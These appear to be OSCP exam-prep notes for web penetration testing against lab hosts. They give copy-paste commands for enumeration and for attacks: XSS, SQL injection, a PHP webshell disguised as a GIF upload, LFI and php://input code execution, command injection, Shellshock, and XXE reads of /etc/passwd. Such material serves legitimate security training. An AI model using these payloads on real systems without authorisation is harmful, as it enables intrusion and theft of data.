# Web Application Enumeration & Exploitation Notes (OSCP-Ready)

> Use this when a target exposes HTTP(S). All commands are inline grey and copy/paste friendly. Outputs are saved under `scans/<TARGET>`.

- **Covers**: Module 8 web methodology & tools (Nmap, Wappalyzer, Gobuster, Burp), enumeration (headers, cookies, source, APIs), and core attacks (**XSS**, **SQLi**, **LFI/RFI**, **File-upload**, **SSTI**, **XXE**, **Cmd-inj**), with **post-exploitation evidence** habits.  
- **Why this format**: candidates pass more reliably with **one organized notes repo** vs scattered PDFs/Notion.  
- **HTB web labs**: practice flow aligns with typical HTB web boxes (**manual**, **no metasploit**).

---

## 0) Quickstart

- `mkdir -p scans/10.10.10.5/http scans/10.10.10.5/notes`

> **Mistake → Fix** — Messy evidence & missing screenshots/logs → Always log output into `scans/<host>/...` as you go; it saves hours when writing the report.

---

## 1) Fingerprint the Web Stack

- Nmap quick enum → `nmap -p80,443 -sV --script=http-enum -oA scans/10.10.10.5/http/nmap_http 10.10.10.5`  
- Whatweb → `whatweb http://10.10.10.5 | tee scans/10.10.10.5/http/whatweb.txt`  
- Curl headers → `curl -i -s http://10.10.10.5 | tee scans/10.10.10.5/http/headers_http.txt`  

---

## 2) Content Discovery

- Gobuster → `gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirb/common.txt -t 10 -o scans/10.10.10.5/http/gobuster_common.txt`  
- Robots.txt → `curl -s http://10.10.10.5/robots.txt | tee scans/10.10.10.5/http/robots.txt`  
- Sitemap → `curl -s http://10.10.10.5/sitemap.xml | tee scans/10.10.10.5/http/sitemap.xml`  

---

## 3) Curated Relative Web Paths (OSCP quick wins)

| Path | Likely contents | Quick tell |
|---|---|---|
| `/dev/` | test tools, `phpbash.php` | Gobuster finds “dev/test” |
| `/uploads/` | user uploads (maybe exec) | check weak MIME |
| `/backup/`, `/backups/` | `.zip`, `.tar`, `.sql`, `.bak` | look for old configs |
| `/admin/` | admin panels | try default creds |
| `/config/` | config files with creds | grep `pass\|user\|key` |
| `/old/`, `/tmp/`, `/test/` | legacy code | directory listing |
| `/.git/`, `/.svn/` | repo leaks | test `/.git/HEAD` |
| `/api/`, `/v1/` | JSON APIs | `curl` returns JSON |

---

## 4) Burp Suite

- Start Burp → `burpsuite`  
- Proxy Firefox → `127.0.0.1:8080`  
- Use Proxy → HTTP history, Repeater, Intruder  

---

## 5) API Enumeration

- Create pattern file → `cat > scans/10.10.10.5/http/api.pattern`  
- Add lines → `{GOBUSTER}/v1` and `{GOBUSTER}/v2`  
- Save → `EOF`  
- Run gobuster → `gobuster dir -u http://10.10.10.5:5001 -w /usr/share/wordlists/dirb/big.txt -p scans/10.10.10.5/http/api.pattern -o scans/10.10.10.5/http/gobuster_api.txt`  
- Probe endpoint → `curl -i http://10.10.10.5:5001/users/v1 | tee scans/10.10.10.5/http/api_users_v1.txt`  

---

## 6) Common Attack Checks

### 6.1 XSS
- Reflected → `curl -G --data-urlencode 'q=<script>alert(1)</script>' http://10.10.10.5/search`  
- Stored header → `curl -i -s http://10.10.10.5/ -H "User-Agent: <script>alert(42)</script>"`  

### 6.2 SQL Injection
- Union → `curl "http://10.10.10.5/item.php?id=1 UNION SELECT 1,2,3-- "`  
- Boolean → `curl "http://10.10.10.5/item.php?id=1' AND '1'='1-- "`  
- Time → `curl "http://10.10.10.5/item.php?id=1 AND SLEEP(5)-- "`  

### 6.3 File Upload
- Basic test → `curl -F "file=@shell.php.jpg" http://10.10.10.5/upload`  
- Magic bytes trick → `printf "GIF89a;\n<?php system('id'); ?>" > shell.php.gif`  
- Upload gif → `curl -F "file=@shell.php.gif" http://10.10.10.5/upload`  

### 6.4 LFI / RFI
- Passwd → `curl "http://10.10.10.5/index.php?page=../../../../etc/passwd"`  
- Source → `curl "http://10.10.10.5/index.php?page=php://filter/convert.base64-encode/resource=index.php"`  
- php://input → `curl -X POST "http://10.10.10.5/index.php?page=php://input" -d "<?php system('id'); ?>"`  

### 6.5 Command Injection
- Basic → `curl "http://10.10.10.5/ping.php?host=127.0.0.1;id"`  
- Shellshock → `curl -H "User-Agent: () { :; }; /bin/bash -c 'id'" http://10.10.10.5/cgi-bin/status`  

### 6.6 SSTI
- Jinja2 test → `curl "http://10.10.10.5/page?name={{7*7}}"`  

### 6.7 XXE
- Create XML file with → `<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`  
- Send → `curl -H 'Content-Type: application/xml' --data-binary @scans/10.10.10.5/http/xxe.xml http://10.10.10.5/upload-xml`  

---

## 7) Browser DevTools

- Firefox Inspector → review HTML, JS, hidden inputs.  
- Firefox Network → capture headers, redirects.  

---

## 8) Evidence & Reporting

- Start logging → `script -f scans/10.10.10.5/term.log`  
- Stop logging → `exit`  
- Screenshot **whoami / hostname / ip / proof.txt**.  

---

## 9) Post-Foothold Checklist

- Windows quick enum → `whoami /all & systeminfo & ipconfig /all & route print & arp -a & tasklist > post_enum_windows.txt`  
- Linux quick enum → `( whoami; id; uname -a; cat /etc/os-release; ip -a || ifconfig -a; ip r || route -n; ss -tulpn || netstat -tulpn ) > post_enum_linux.txt`  

---

## 10) One-Command Kickoff

- `TARGET=10.10.10.5; mkdir -p scans/$TARGET/http && whatweb http://$TARGET | tee scans/$TARGET/http/whatweb.txt && curl -i -s http://$TARGET | tee scans/$TARGET/http/headers_http.txt && gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt -t 10 -o scans/$TARGET/http/gobuster_common.txt && curl -s http://$TARGET/robots.txt | tee scans/$TARGET/http/robots.txt`

---

## References
- PEN-200 Modules (esp. 8: Web Methodology, Tools, Enumeration, XSS)  
- Service Enumeration Cards (HTTP paths & mini-playbooks)  
- OSCP Fail Patterns (notes hygiene, timeboxing, screenshots discipline)
